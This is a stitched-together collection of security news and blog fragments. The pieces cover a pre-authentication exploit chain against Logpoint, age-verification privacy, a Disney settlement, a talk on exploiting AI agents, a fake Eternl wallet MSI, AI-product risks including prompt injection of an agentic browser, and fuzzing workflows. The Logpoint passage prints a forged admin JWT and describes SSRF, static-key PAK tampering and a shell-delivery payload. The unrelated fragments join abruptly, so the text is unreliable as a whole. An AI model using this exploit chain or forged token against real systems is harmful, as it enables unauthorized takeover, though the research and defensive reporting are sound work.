token claims. The first critical, directly exploitable issue is that the signing secret is hard-coded as a static constant. I can mint my own valid JWTs with  and arbitrary  and  claims, then access any endpoint that relies on the  header within the Java microservice world!!!Forging the valid JWT Token I copied all the required jar files from Logpoint instance to my local at the beginning. I used them to build the following code to forge a valid JWT token.Note that an “admin” username is created by default on all Logpoint instances. Once you build and run the above code, you will have the following magic token.eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiU1VQRVIiLCJ0b2tlbl90eXBlIjoiQVVUSCIsImlhdCI6MTcxODcwNzI4OH0.EBgc_BGubwbLH-91M4rFnd0BguvTAJHod1YObw5fqJcI hit the /soar/sso/v1/user/auth/apikey endpoint. And once again, the goal is to reach it from the external network. To do that, I simply prepend  to the path, which tells the first Nginx instance to route the request straight to the login microservice.That is exciting, but it immediately raises another question. What exactly is this  in the response, and why does it look completely different from the JWT token I am already using? Once again, the answer is clearly hiding in the code.Bug 3: Escalating privileges to the Hidden internal SOAR UserAs the method name suggests,  maps to , which returns the API credentials stored on the Java side. The response is an array, but it contains only a single  and .It looks like these credentials belong to my admin account and are used internally between SOAR services. The JWT gets me in, but inside the system, authentication shifts to this API key model.That leads to the obvious next question. If I now have an API key, is there an endpoint that accepts it and tells me who I am? I copied the newly leaked  and send the following request.Our new endpoint that actually tells me who I am ? is quite similar to the one I’ve just used. Our new API that takes header is .Our previously used one takes header and returns all the API tokens is Yes, I was confused too. Security through obscurity almost worked. Almost.But the real surprise is in the response itself. The returned JSON answers the question very clearly.It turns out this is not a regular user at all.  is an internal, highest-privilege SOAR account that comes bundled with the installation and is used exclusively for microservice-to-microservice communication. Chaining these 3 bugs, we can hit every single endpoint in the Java microservice component of Logpoint! Critical Thinking: Where to proceed from now on? Chaining issues in the Java microservices clearly expands the attack surface, but it also has a ceiling. Even a full compromise there leaves me inside a container. That is not the endgame.So I shift focus. None of the tokens or API keys apply to the Python backend that runs on the operating system itself, but that raises a far more interesting question. What if I can add more bugs to the chain that lets me initiate an admin session directly on the Python side?That is where the real fun begins.Bug 4: Server-Side Request Forgery leads to Authentication Bypass on LogPoint Python BackendI was thinking about what type of a “bug” I need to add to the chain while I was going through my notes, and I saw the following log!That immediately brings me back to the service listening on , accessible only from within the appliance. Until now, I had never bothered to read that part of the code. There was simply no reason to.But now there is. If something exploitable lives there, I do not need direct access. I can pivot back to the Java side and look for an SSRF to reach it. And since the request would originate from localhost, access controls would not stand in the way at all.At that point, the path forward becomes very clear. And I’ve found something that I can actually use! The above endpoint simply returns the  of the user! But hold your horses, I have even more questions now. This internal API exists as a bridge between the Java SOAR services and the legacy Python backend, allowing them to communicate when new Docker based features are added to an older core platform. From an attacker’s perspective, it is a perfect SSRF target. But it is not a normal public endpoint. Only a small set of internal APIs accept and return data, all designed strictly for microservice use.How can I take an advantage of this key to initiate new session cookie on the Python side ? Further reading of the Python code base showed me an interesting if-else statement on the  endpoint. Sending a simple HTTP POST request with a valid username and secret_key is enough to initiate a valid session and retrieve a COOKIE.I’m ready to hunt an SSRF in the Java layer! This is my final pass through this containerized LogPoint microservice.Up to this point, I was still inside a container. That boundary was about to disappear.Root cause analysis of the ConfigTest SSRFFinding the right candidates and knowing where to look in the codebase turns out to be fairly easy with simple IDE searches. I also use Semgrep to speed things up, but the details of that process are not important here.When a request is sent to /soar/api/v1/soar-sources/config/test/run, it is routed to an internal docker container named . The controller method is implemented at api/soar/sources/SoarSourcesApi.java.The above code is pretty straightforward. JSON body of the request is send to the When I have a look at the  class to understand the JSON data structer, because its populated from the HTTP body on the controller method, I didn’t even need to read the  at all.The implementation simply concatenates the scheme, machine IP, port, and path. There is no validation on any of these fields. By appending a query string to , everything that follows including the path and port is treated as part of the query.That changes everything. With this in place, I can force the application to issue a GET request to any URL I choose.Bonus tip: I append  to the end because the runner tends to concatenate extra path/port fragments onto our input/host. By starting a query string early, anything it appends later is treated as part of the , not the actual host/pathThe only missing piece is a valid  for the first parameter, which turns out to be easy to obtain from the /soar/api/v1/soar-sources/config endpoint itself! Recap of the chaining of 4 bugsNow there is only one thing left to do. Find a code execution bug in the Python backend. And, as it turns out, that opens up yet another rabbit hole waiting to be explored.Bug 5 – Authenticated Code Evaluation Vulnerability on Python-BackendAt this point, the task becomes surprisingly simple. I no longer need to read the entire codebase. Instead, I narrow my focus and start hunting for sinks, the places where potentially dangerous functions are used and where a small mistake could turn into something much bigger.I’ve found the following code section, and it already indicates this is related to the rule engine. But since the operators are all comparison operators, there is no way these  and parameters are validated before reaching here, right? Now all I had to do was look for all the references of this  class to see that these left or right can be anything other than an integer. The traverse back to the source from our sink. There is only one place this function has been called, which is  . That’s where the quite small mistake made my day!As you might remember, I can only place my payload into either the first or the second parameter of . The second parameter is where the small but critical mistake happens. Instead of being validated, self.get("trigger_value") it simply pulls the value directly from the object’s attributes.What makes this interesting is that  already has a method designed specifically for this purpose. It properly casts the value to an . But that method is never used here! The value is taken straight from the getter and passed along as is.Let’s continue tracing the caller chain. The  function is only called from a single place. It lives inside the  class, which spans more than 300 lines of code. To keep the focus on what matters, I omit everything else and show only the lines relevant to the behavior in question.The win condition is finally clear. If I can save my own alert in the database with a payload embedded in the  field, I can enable the rule using a deliberately generic query, so it always matches. The moment the engine evaluates that condition, it also evaluates my payload. That is the point where it stops being theory and becomes remote code execution.The question is not whether a rule can be created.The real question is whether validation catches it this time, or whether I get lucky twice ?Bug 6 – Exploiting AES Static key to import encrypted PAK file to bypass integer validationThe following UI screenshot shows how to create an alert rule, and unfortunately, we didn’t get lucky twice in a row. Condition value is validated, and it expects me to send an integer. Therefore, there is no way that I can actually implant my payload into the rule!That is the moment I realize I have tunnel vision. I am already deep down the rabbit hole, pushing in one direction for too long. It feels like the right time to step back, stop forcing it, and look for danger elsewhere.I start closing browser tabs. And right before I’m done, I notice it.A button quietly sitting there.  Button.I export the rule and immediately notice something interesting. Its contents are encrypted. When I import it back into LogPoint, it gets decrypted and written into the database exactly as expected.That is when a familiar pattern clicks. Encryption often creates an illusion of trust. Once data is encrypted, engineers often assume it is safe and unchanged and therefore skip the validation steps they would apply before. If the system trusts whatever comes out of decryption, then the real challenge is no longer validation.All I need to do is understand how this encryption works and modify the rule. A closer look at the implementation reveals the crucial detail. The AES key used during the alert export process is static.Most of the cryptography related code of the following script is taken directly from the original codebase. One of the shortest paths to a shell is a simple web delivery payload. Once our payload runs, LogPoint appliance will run command to get the 2nd stage of the payload from our server and pipe it into the ! Bit noisy yeah, but this is also not a red-team exercise.I wrap the payload inside an  call because the sink in  concatenates additional strings around the variable. That behavior makes it easy to run into Python syntax errors, which is something I want to avoid entirely. The goal is simple: execute my code cleanly. Anything that happens after my own  runs is irrelevant.Once I imported the backdoored-implanted-rule.pak file I generated, rule successfully imported! Now I need to find a way to trigger the rule 🙂Last step: How To Trigger the AlertImporting the modified alert is not enough. I still need a way to trigger it and reach the vulnerable code path.The simplest approach is to create a rule and attach it to the alert. Conveniently, this can be done inside the same PAK file. I open the  file generated during the alert-pak-file-decrypt.run step and start wiring the pieces together.The rule itself is deliberately simple. If there is a GET request to  with a Google crawler user agent, the rule triggers.I send around a hundred requests to hit the threshold. Since the rule scans logs from the past 30 days and runs every minute, I just need to wait briefly for the engine to pick it up and execute.(By default, Logpoint populates its own logs into the indexes. That means we can use LogPoint HTTP port to send these robots.txt requests)Exploit in Action: Chaining 6 bugs + 1 feature together! Pre-authenticated Remote Code ExecutionI record my exploit on actionRecap of the attack chainWhat begins as a routing issue at the edge propagates through internal services, authentication logic, and finally reaches the Python backend, static AES key, and Code Eval bug, resulting in remote code execution.

Overnight, users found entire categories of sites locked behind ID checks, platforms geo‑blocking whole countries, and VPN traffic surging as people tried to get around the new walls.​The core tension: safety vs privacyThe fundamental challenge for websites and services is not checking age in principle, but how to do it without turning everyday browsing into an identity check. Almost every viable method asks users to hand over sensitive data, raising the stakes if (or more likely when) that data leaks in a breach.​For ordinary users, the result is a confusing mess of blocks, prompts, and workarounds. On paper, countries want better protection for minors. In practice, adults discover that entire platforms are unavailable unless they are prepared to disclose personal information or disguise where they connect from. No website wants to be the one blamed after an age‑verification database is compromised, yet regulators continue to push for stronger identity links.​How age checks actually work: Users upload a selfie or short video so an algorithm can guess whether they look over 18, which avoids storing documents but relies on sensitive biometrics and imperfect accuracy.​ An age‑check service queries your bank for a simple “adult or not” answer. It may be convenient on paper but it’s a hard sell when the relying site is an adult platform.​Digital identity services: Digital ID wallets can assert “over 18” without exposing full credentials, but they add yet another app and infrastructure layer that must be trusted and widely adopted.​Using a valid payment card as a proxy for adulthood is simple and familiar, but it excludes adults without cards and does not cover lower age thresholds like “over 13.”​ Systems infer age from where an email address has been used (such as banks or utilities), effectively encouraging cross‑service profiling and “digital snooping.”​Providers indicate whether an account has age‑related restrictions. This can be fast, but is unreliable for pay‑as‑you‑go accounts, burner SIMs, or poorly maintained records.​Users upload an ID document plus a selfie so systems can match faces and ages. This is effective, but concentrates highly sensitive identity data in yet another attractive target for attackers.​My personal preference would be double‑blind verification: a third‑party provider verifies your age, then issues a simple token like “18+” to sites without revealing your identity or learning which site you visit, offering stronger privacy than most current approaches.​In almost every case, users must surrender personal information or documents to prove their age, increasing the risk that identity data ends up in the wrong hands. This turns age gates into long‑lived security liabilities rather than temporary access checks.​Geoblocking, VPNs, and cross‑border frictionsRight now, most platforms comply by detecting user location via IP address and then either demanding age checks or denying access entirely to users in specific regions. France’s enforcement actions, for example, led several major adult sites to geo-block the entire country in 2025, while the UK’s Online Safety Act coincided with a sharp rise in VPN use rather than widespread cross-border blocking.European regulators generally focus on domestic ISPs, Digital Services Act reporting, and large platform fines rather than on filtering traffic from other countries, partly because broad traffic blocking raises net‑neutrality and technical complexity concerns. In the US, some state proposals have explicitly targeted VPN circumventions, signalling a willingness to attack the workarounds rather than the underlying incentives.​Meanwhile, network‑level filtering vendors advertise “cross‑border” controls and VPN detection for governments, hinting at future scenarios where unregulated inbound flows or anonymity tools are aggressively throttled. If enforcement pressure grows, these capabilities could evolve from niche offerings into standard state infrastructure.​A future of less anonymity?A common argument is that eroding online anonymity will also curb toxic behavior and abuse on social media, since people act differently when their real‑world identity is at stake. But tying everyday browsing to identity checks risks chilling legitimate speech and exploration long before it delivers any proven civility benefits.​A world where every connection requires ID is unlikely to arrive overnight. Still, the direction of travel is clear: more countries are normalizing age gates that double as identity checks, and more users are learning to route around them. Unless privacy‑preserving systems like robust double‑blind verification become the norm, age‑verification policies intended to protect children may end up undermining both privacy and open access to information.​We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>Disney will pay $10 million to settle children&apos;s data privacy lawsuit</title><link>https://www.bleepingcomputer.com/news/security/disney-will-pay-10m-to-settle-claims-of-childrens-privacy-violations-on-youtube/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 31 Dec 2025 09:43:26 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A federal judge has approved an order requiring Disney to pay a $10 million civil penalty to settle claims that it violated the Children's Online Privacy Protection Act by mislabeling videos and allowing data collection for targeted advertising.

It was great to attend the `39C3 - Power Cycles` in Hamburg this year. The Chaos Communication Congress was once again packed with great talks, amazing people, awesome events and side quests - and I even got to present!

You can watch the talk with translation options on media.ccc.de.

I also uploaded the English version to the Embrace The Red YouTube channel. I hope it’s interesting and helpful.

The talk is titled “Agentic ProbLLMs: Exploiting AI Computer-Use and Coding Agents” and is about my security research on vulnerabilities in agentic systems and the Month of AI Bugs with lots of demos.

A PDF version of the slides is here.

Looking forward to the next Chaos Communication Congress.

Safe travels back home and Happy Hacking, everyone!

It reinforces trust by emphasizing “local-first, non-browser signing,” positioning the application as a more secure alternative to browser based wallets. The overall messaging maintains a polished, professional tone with no visible spelling or grammatical issues, lending credibility to the communication. This is capped with a strong, authoritative call to action  “Eternl Desktop is where Cardano decisions are finalized.” designed to create urgency and frame the software as an essential tool for serious Cardano participants.Download Infrastructure Red FlagsThe provided download URL, hxxps://download[.]eternldesktop[.]network, raises immediate concerns, as the domain appears to be newly created and lacks any established historical reputation. There is no independent verification or announcement from official, well known Eternl communication channels to validate its legitimacy. Additionally, the software is distributed as a direct MSI installer without publicly available checksums, digital signature transparency, or formal release notes, preventing users from independently verifying the integrity and authenticity of the installer before execution.New infrastructure + wallet software + MSI installer is a high-risk combination.File Name: Eternl.msiFile Size: 23.3MBFile Type: Windows Intaller (MSI)Hash: 8fa4844e40669c1cb417d7cf923bf3e0Title: LogMeIn Resolve UnattendedComments: LogMeIn Resolve Unattended v1.30.0.636Using CFF Explorer, I identified an embedded executable within the MSI file.

This one looks at how the rapid rise of Artificial Intelligence (AI) is putting users at risk.In 2025 we saw an ever-accelerating race between AI providers to push out new features. We also saw manufacturers bolt AI onto products simply because it sounded exciting. In many cases, it really shouldn’t have.Agentic or AI browsers that can act autonomously to execute tasks introduced a new set of vulnerabilities—especially to prompt injection attacks. With great AI power comes great responsibility, and risk. If you’re thinking about using an AI browser, it’s worth slowing down and considering the security and privacy implications first. Even experienced AI providers like OpenAI (the makers of ChatGPT) were unable to keep their agentic browser Atlas secure. By pasting a specially crafted link into the Omnibox, attackers were able to trick Atlas into treating a URL input as a trusted command.The popularity of AI chatbots created the perfect opportunity for scammers to distribute malicious apps. Even if the AI engine itself worked perfectly, attackers have another way in: fake interfaces. According to BleepingComputer, scammers are already creating spoofed AI sidebars that look identical to real ones from browsers like OpenAI’s Atlas and Perplexity’s Comet. These fake sidebars mimic the real interface, making them almost impossible to spot.And then there’s this special category of using AI in products because it sounds cooler with AI or you can ask for more money from buyers.We saw a plush teddy bear promising “warmth, fun, and a little extra curiosity” that was taken off the market after researcher found its built-in AI responding with sexual content and advice about weapons. Conversations escalated from innocent to sexual within minutes. The bear didn’t just respond to explicit prompts, which would have been more or less understandable. Researchers said it introduced graphic sexual concepts on its own, including BDSM-related topics, explained “knots for beginners,” and referenced roleplay scenarios involving children and adults.Sometimes we rely on AI systems too much and forget that they hallucinate. As in the case where a school’s AI system mistook a boy’s empty Doritos bag for a gun and triggered a full-blown police response. Multiple police cars arrived with officers drawing their weapons, all because of a false alarm.We’ve said it before and we’ll probably say it again:  We keep pushing the limits of what AI can do faster than we can make it safe.

# Bugs that survive the heat of continuous fuzzing

Learn why some long-enrolled OSS-Fuzz projects still contain vulnerabilities and how you can find them.

Even when a project has been intensively fuzzed for years, bugs can still survive.

​​OSS-Fuzz is one of the most impactful security initiatives in open source. In collaboration with the OpenSSF Foundation, it has helped to find thousands of bugs in open-source software.

Today, OSS-Fuzz fuzzes more than 1,300 open source projects at no cost to maintainers. However, continuous fuzzing is not a silver bullet. Even mature projects that have been enrolled for years can still contain serious vulnerabilities that go undetected. In the last year, as part of my role at GitHub Security Lab, I have audited popular projects and have discovered some interesting vulnerabilities.

Below, I’ll show three open source projects that were enrolled in OSS-Fuzz for a long time and yet critical bugs survived for years. Together, they illustrate why fuzzing still requires active human oversight, and why improving coverage alone is often not enough.

### Gstreamer

GStreamer is the default multimedia framework for the GNOME desktop environment. On Ubuntu, it’s used every time you open a multimedia file with Totem, access the metadata of a multimedia file, or even when generating thumbnails for multimedia files each time you open a folder.

In December 2024, I discovered 29 new vulnerabilities, including several high-risk issues.

To understand how 29 new vulnerabilities could be found in a software that has been continuously fuzzed for seven years, let’s have a look at the public OSS-Fuzz statistics available here. If we look at the GStreamer stats, we can see that it has only two active fuzzers and a code coverage of around 19%. By comparison, a heavily researched project like **OpenSSL** has **139 fuzzers**(yes, 139 different fuzzers, that is not a typo).

And the popular compression library **bzip2** reports a code coverage of **93.03%**, a number that is almost five times higher than GStreamer’s coverage.

Even without being a fuzzing expert, we can guess that GStreamer’s numbers are not good at all.

And this brings us to our first reason: OSS-Fuzz still requires human supervision to monitor project coverage and to write new fuzzers for uncovered code. We have good hope that AI agents could soon help us fill this gap, but until that happens, a human needs to keep doing it by hand.

The other problem with OSS-Fuzz isn’t technical. It’s due to its users and the false sense of confidence they get once they enroll their projects. Many developers are not security experts, so for them, fuzzing is just another checkbox on their security to-do list. Once their project is “being fuzzed,” they might feel it is “protected by Google” and forget about it. Even if the project actually fails during the build stage and isn’t being fuzzed at all (which happens to more than one project in OSS-Fuzz).

This shows that human security expertise is still required to maintain and support fuzzing for each enrolled project, and that doesn’t scale well with OSS-Fuzz’s success!

### Poppler

Poppler is the default PDF parser library in Ubuntu. It’s the library used to render PDFs when you open them with **Evince** (the default document viewer in Ubuntu versions prior to 25.04) or **Papers** (the default document viewer for GNOME desktop and the default document viewer from newer Ubuntu releases).

If we check Poppler stats in OSS-Fuzz, we can see it includes a total of 16 fuzzers and that its code coverage is around 60%. Those are quite solid numbers; maybe not at an excellent level, but certainly above average.

That said, a few months ago, my colleague Kevin Backhouse published a 1-click RCE affecting Evince in Ubuntu. The victim only needs to open a malicious file for their machine to be compromised. The reason a vulnerability like this wasn’t found by OSS-Fuzz is a different one: **external dependencies**.

Poppler relies on a good bunch of external dependencies: freetype, cairo, libpng… And based on the low coverage reported for these dependencies in the Fuzz Introspector database, we can safely say that they have not been instrumented by libFuzzer. As a result, the fuzzer receives no feedback from these libraries, meaning that many execution paths are never tested.

But it gets even worse: Some of Evince’s default dependencies aren’t included in the OSS-Fuzz build at all. That’s the case with **DjVuLibre**, the library where I found the critical vulnerability that Kevin later exploited.

DjVuLibre is a library that implements support for the DjVu document format, an open source alternative to PDF that was popular in the late 1990s and early 2000s for compressing scanned documents. It has become much less widely used since the standardization of the PDF format in 2008.

The surprising thing is that while this dependency isn’t included among the libraries covered by OSS-Fuzz, it is shipped by default with Evince and Papers. So these programs were relying on a dependency that was “unfuzzed” and at the same time, installed on millions of systems by default.

This is a clear example of how software is only as secure as the weakest dependency in its dependency graph.

### Exiv2

Exiv2 is a C++ library used to read, write, delete, and modify Exif, IPTC, XMP, and ICC metadata in images. It’s used by many mainstream projects such as GIMP and LibreOffice among others.

Back in 2021, my teammate Kevin Backhouse helped improve the security of the Exiv2 project. Part of that work included enrolling Exiv2 in OSS-Fuzz for continuous fuzzing, which uncovered multiple vulnerabilities, like CVE-2024-39695, CVE-2024-24826, and CVE-2023-44398.

Despite the fact that Exiv2 has been enrolled in OSS-Fuzz for more than three years, new vulnerabilities have still been reported by other vulnerability researchers, including CVE-2025-26623 and CVE-2025-54080.

In that case, the reason is a very common scenario when fuzzing media formats: Researchers always tend to focus on the **decoding** part, since it is the most obviously exploitable attack surface, while the **encoding** side receives less attention. As a result, vulnerabilities in the encoding logic can remain unnoticed for years.

From a regular user perspective, a vulnerability in an encoding function may not seem particularly dangerous. However, these libraries are often used in many background workflows (such as thumbnail generation, file conversions, cloud processing pipelines, or automated media handling) where an encoding vulnerability can be more critical.

## The five-step fuzzing workflow

At this point it’s clear that fuzzing is not a magic solution that will protect you from everything. To assure minimum quality, we need to follow some criteria.

In this section, you’ll find the fuzzing workflow I’ve been using with very positive results in the last year: the **five-step fuzzing workflow** (preparation – coverage – context – value – triaging).

### Step 1: Code preparation

This step involves applying all the necessary changes to the target code to optimize fuzzing results. These changes include, among others:

- Removing checksums
- Reducing randomness
- Dropping unnecessary delays
- Signal handling

If you want to learn more about this step, check out this blog post.

### Step 2: Improving code coverage

From the previous examples, it is clear that if we want to improve our fuzzing results, the first thing we need to do is to improve the code coverage as much as possible.

In my case, the workflow is usually an iterative process that looks like this:

Run the fuzzers > Check the coverage > Improve the coverage > Run the fuzzers > Check the coverage > Improve the coverage > …

The “check the coverage” stage is a manual step where i look over the LCOV report for uncovered code areas and the “improve the coverage” stage is usually one of the following:

- Writing new fuzzing harnesses to hit new code that would otherwise be impossible to hit
- Creating new input cases to trigger corner cases

For an automated, AI-powered way of improving code coverage, I invite you to check out the **Plunger** module in my FRFuzz framework. FRFuzz is an ongoing project I’m working on to address some of the caveats in the fuzzing workflow. I will provide more details about FRFuzz in a future blog post.

Another question we can ask ourselves is: _“_ When can we stop increasing code coverage? _”_ In other words, when can we say the coverage is good enough to move on to the next steps?

Based on my experience fuzzing many different projects, I can say that this number should be **>90%**. In fact, I always try to reach that level of coverage before trying other strategies, or even before enabling detection tools like ASAN or UBSAN.

To reach this level of coverage, you will need to fuzz not only the most obvious attack vectors such as decoding/demuxing functions, socket-receivers, or file-reading routines, but also the less obvious ones like encoders/muxers, socket-senders, and file-writing functions.

You will also need to use advanced fuzzing techniques like:

- **Fault injection**: A technique where we intentionally introduce unexpected conditions (corrupted data, missing resources, or failed system calls) to see how the program behaves. So instead of waiting for real failures, we simulate these failures during fuzzing. This helps us to uncover bugs in execution paths that are rarely executed, such as:
  - Failed memory allocations (malloc returning NULL)
  - Interrupted or partial reads/writes
  - Missing files or unavailable devices
  - Timeouts or aborted network connections

A good example of fault injection is the Linux kernel Fault injection framework

- **Snapshot fuzzing**: Snapshot fuzzing takes a snapshot of the program at any interesting state, so the fuzzer can then restore this snapshot before each test case. This is especially useful for stateful programs (operating systems, network services, or virtual machines). Examples include the QEMU mode of AFL++ and the AFL++ Nyx mode.

### Step 3: Improving context-sensitive coverage

By default, the most common fuzzers (aka AFL++, libfuzzer, and honggfuzz) track the code coverage at the **edge level**. We can define an “edge” as a transition between two basic blocks in the control-flow graph. So if execution goes from block A to block B, the fuzzer records the edge A → B as “covered.” For each input the fuzzer runs, it updates a bitmap structure marking which edges were executed as a 0 or 1 value (currently implemented as a byte in most fuzzers).

In the following example, you can see a code snippet on the left and its corresponding control-flow graph on the right:

Each numbered circle corresponds to a basic block, and the graph shows how those blocks connect and which branches may be taken depending on the input. This approach to code coverage has demonstrated to be very powerful given its simplicity and efficiency.

However, edge coverage has a big limitation: It doesn’t track the order in which blocks are executed.

So imagine you’re fuzzing a program built around a plugin pipeline, where each plugin reads and modifies some global variables. Different execution orders can lead to very different program states, while the edge coverage can still look identical. Since the fuzzer thinks it has already explored all the paths, the coverage-guided feedback won’t keep guiding it, and the chances of finding new bugs will drop.

To address this, we can make use of **context-sensitive coverage**. Context-sensitive coverage not only tracks which edges were executed, but it also tracks what code was executed right before the current edge.

For example, AFL++ implements two different options for context-sensitive coverage:

- **Context- sensitive branch coverage**: In this approach, every function gets its own unique ID. When an edge is executed, the fuzzer takes the IDs from the current call stack, hashes them together with the edge’s identifier, and records the combined value.

You can find more information on AFL++ implementation here

- **N-Gram Branch Coverage**: In this technique, the fuzzer combines the current location with the previous N locations to create a context-augmented coverage entry. For example:
  - 1-Gram coverage: looks at only the previous location
  - 2-Gram coverage: considers the previous two locations
  - 4-Gram coverage: considers the previous four

You can see how to configure it in AFL++ here

In contrast to edge coverage, it’s not realistic to aim for a coverage >90% when using context-sensitive coverage. The final number will depend on the project’s architecture and on how deep into the call stack we decide to track. But based on my experience, anything above **60%** can be considered a very good result for context-sensitive coverage.

### Step 4: Improving value coverage

To explain this section, I’m going to start with an example. Take a look at the following web server code snippet:

Here we can see that the function `unicode_frame_size` has been executed 1910 times. After all those executions, the fuzzer didn’t find any bugs. It looks pretty secure, right?

However, there is an obvious div-by-zero bug when `r.padding == FRAME_SIZE * 2`:

Since the padding is a client-controlled field, an attacker could trigger a DoS in the webserver, sending a request with a padding size of exactly 2156 \* 2 = **4312 bytes**. Pretty annoying that after 1910 iterations the fuzzer didn’t find this vulnerability, don’t you think?

Now we can conclude that even having 100% code coverage is not enough to guarantee that a code snippet is free of bugs. So how do we find these types of bugs? And my answer is: **Value Coverage**.

We can define value coverage as the coverage of values a variable can take. Or in other words, the fuzzer will now be guided by variable value ranges, not just by control-flow paths.

If, in our earlier example, the fuzzer had value-covered the variable `r.padding`, it could have reached the value 4312 and in turn, detected the divide-by-zero bug.

So, how can we make the fuzzer to transform variable values in different execution paths? The first naive implementation that came to my mind was the following one:

```
inline uint32_t value_coverage(uint32_t num) { uint32_t no_optimize = 0; if (num < UINT_MAX / 2) { no_optimize += 1; if(num < UINT_MAX / 4){ no_optimize += 2; ... }else{ no_optimize += 3 ... } }else{ no_optimize += 4; if(num < (UINT_MAX / 4) * 3){ no_optimize += 5; ... }else{ no_optimize += 6; ... } } return no_optimize; }
```

In this code, I implemented a function that maps different values of the variable `num` to different execution paths. Notice the `no_optimize` variable to avoid the compiler from optimizing away some of the function’s execution paths.

After that, we just need to call the function for the variable we want to value-cover like this:

```
static volatile uint32_t vc_noopt; uint32_t webserver::unicode_frame_size(const HttpRequest& r) { //A Unicode character requires two bytes vc_noopt = value_coverage(r.padding); //VALUE_COVERAGE uint32_t size = r.content_length / (FRAME_SIZE * 2 - r.padding); return size; }
```

Given the huge number of execution paths this can generate, you should only apply it to certain variables that we consider “strategic.” By strategic, I mean those variables that can be directly controlled by the input and that are involved in critical operations. As you can imagine, selecting the right variables is not easy and it mostly comes down to the developers and researchers experience.

The other option we have to reduce the total number of execution paths is by using the concept of “ **buckets**”: Instead of testing all 2^32 possible values of a 32 bits integer, we can group those values into buckets, where each bucket transforms into a single execution path. With this strategy, we don’t need to test every single value and can still achieve good results.

These buckets also don’t need to be symmetrically distributed across the full range. We can emphasize certain subranges by creating smaller buckets or, create bigger buckets for ranges we are not so interested in.

Now that I’ve explained the strategy, let’s take a look at what real-world options we have to get value coverage in our fuzzers:

- **AFL++ CmpLog** **/** **Clang trace-cmp**: These focus on tracing comparison values (values used in calls to `==`, `memcmp`, etc.). They wouldn’t help us find our divide-by-zero bug, since they only track values used in comparison instructions.
- **Clang trace-div** **+** **libFuzzer -use\_value\_profile=1**: This one would work in our example, since it traces values involved in divisions. But it doesn’t give us variable-level granularity, so we can only limit its scope by source file or function, not by specific variable. That limits our ability to target only the “strategic” variables.

To overcome these problems with value coverage, I wrote my own custom implementation using the LLVM FunctionPass functionality. You can find more details about my implementation by checking the FRFuzz code here.

## The last mile: almost undetectable bugs

Even when you make use of all up-to-date fuzzing resources, some bugs can still survive the fuzzing stage. Below are two scenarios that are especially hard to tackle with fuzzing.

### Big input cases

These are vulnerabilities that require very large inputs to be triggered (on the order of megabytes or even gigabytes). There are two main reasons they are difficult to find through fuzzing:

- Most fuzzers cap the maximum input size (for example 1 MB in the case of AFL), because larger inputs lead to longer execution times and lower overall efficiency.

- The total possible input space is exponential: O(256ⁿ), where _n_ is the size in bytes of the input data. Even when coverage-guided fuzzers use heuristic approaches to tackle this problem, fuzzing is still considered a sub-exponential problem, with respect to input size. So the probability of finding a bug decreases rapidly as the input size grows.

For example, CVE-2022-40303 is an integer overflow bug affecting libxml2 that requires an input larger than 2GB to be triggered.

### Bugs that require “extra time” to be triggered

These are vulnerabilities that can’t be triggered within the typical per-execution time limit used by fuzzers. Keep in mind that fuzzers aim to be as fast as possible, often executing hundreds or thousands of test cases per second. In practice, this means per-execution time limits on the order of 1–10 milliseconds, which is far too short for some classes of bugs.

As an example, my colleague Kevin Backhouse found a vulnerability in the Poppler code that fits well in this category: the vulnerability is a reference-count overflow that can lead to a use-after-free vulnerability.

Reference counting is a way to track how many times a pointer is referenced, helping prevent vulnerabilities such as use-after-free or double-free. You can think of it as a semi-manual form of garbage collection.

In this case, the problem was that these counters were implemented as 32-bit integers. If an attacker can increment the counter up to 2^32 times, it will wrap the value back to 0 and then trigger a use-after-free in the code.

Kevin wrote a proof of concept that demonstrated how to trigger this vulnerability. The only problem is that it turned out to be quite slow, making exploitation unrealistic: The PoC took 12 hours to finish.

That’s an extreme example of a bug that needs “extra time” to manifest, but many vulnerabilities require at least seconds of execution to trigger. Even that is already beyond the typical limits of existing fuzzers, which usually set per-execution timeouts well under one second.

That’s why finding vulnerabilities that require seconds to trigger is almost a chimera for fuzzers. And this effectively discards a lot of real-world exploitation scenarios from what fuzzers can find.

It’s important to note that although fuzzer timeouts frequently turn out to be false alarms, it’s still a good idea to inspect them. Occasionally they expose real performance-related DoS bugs, such as quadratic loops.

### How to proceed in these cases?

I would like to be able to give you a how-to guide on how to proceed in these scenarios. But the reality is we don’t have effective fuzzing strategies for these case corners yet.

At the moment, mainstream fuzzers are not able to catch these kinds of vulnerabilities. To find them, we usually have to turn to other approaches: static analysis, concolic (symbolic + concrete) testing, or even the old-fashioned (but still very profitable) method of manual code review.

## Conclusion

Despite the fact that fuzzing is one of the most powerful options we have for finding bugs in complex software, **it’s not a fire-and-forget solution**. Continuous fuzzing can identify vulnerabilities, but it can also fail to detect some attack vectors. Without human-driven work, entire classes of bugs have survived years of continuous fuzzing in popular and crucial projects. This was evident in the three OSS-Fuzz examples above.

I proposed a **five-step fuzzing workflow** that goes further than just code coverage, covering also context-sensitive coverage and value coverage. This workflow aims to be a practical roadmap to ensure your fuzzing efforts go beyond the basics, so you’ll be able to find more elusive vulnerabilities.

If you’re starting with open source fuzzing, I hope this blog post helped you better understand current fuzzing gaps and how to improve your fuzzing workflows. And if you’re already familiar with fuzzing, I hope it gives you new ideas to push your research further and uncover bugs that traditional approaches tend to miss.

